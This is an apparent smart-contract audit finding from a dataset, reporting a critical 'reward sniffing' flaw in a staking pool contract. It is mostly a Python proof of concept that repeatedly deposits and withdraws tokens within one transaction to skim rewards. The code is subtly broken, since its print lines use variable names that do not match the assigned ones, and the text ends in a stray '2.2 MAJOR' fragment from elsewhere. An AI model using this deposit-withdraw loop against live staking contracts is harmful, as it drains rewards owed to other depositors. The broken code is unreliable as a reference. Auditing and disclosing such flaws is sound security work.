# [C] CRT-1 Reward sniffing

## Summary
Severity: Critical
Contest weight: 0.2896
Dataset id: 10863
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
User can deposit-withdraw tokens several times (at the same transaction), causing reward sniffing.
The emulation of this behavior is presented below:
```python
def main():
    deployer = accounts[0]
    workerOwner = accounts[1]
    escrow = deployer.deploy(StakingEscrowMock)
    escrow.setAllTokens(9000)
    token = deployer.deploy(EasyToken, 1000_000)
    stacking = deployer.deploy(PoolingStakingContractV2)
    workerFraction = 1
    stacking.initialize(workerFraction, token, escrow, workerOwner, {'from': deployer})
    stacking.enableDeposit({'from': deployer})
    user1 = accounts[2]
    user2 = accounts[3]
    deployer.transfer(stacking, 6000)
    token.mint(user1, 1000_000)
    token.mint(user2, 1000_000)
    token.approve(stacking, 100_000, {'from': user1})
    stacking.depositTokens(100_000, {'from': user1})
    for _ in range(100):
        token.approve(stacking, 100, {'from': user2})
        stacking.depositTokens(100, {'from': user2})
        stacking.withdrawAll({'from': user2})
    user1_balance = token.balanceOf(user1)
    user2_balance = token.balanceOf(user2)
    stacking_balance = token.balanceOf(stacking)
    print("user1balance", user1balance)
    print("user2balance", user2balance)
    print("stackingbalance", stackingbalance)
    stacking.withdrawAll({'from': user1}) # >>>> ERROR HERE <<<<
```

## Recommendation
May be add a check in withdrawAll function to require deposit DISABLED?
2.2 MAJOR
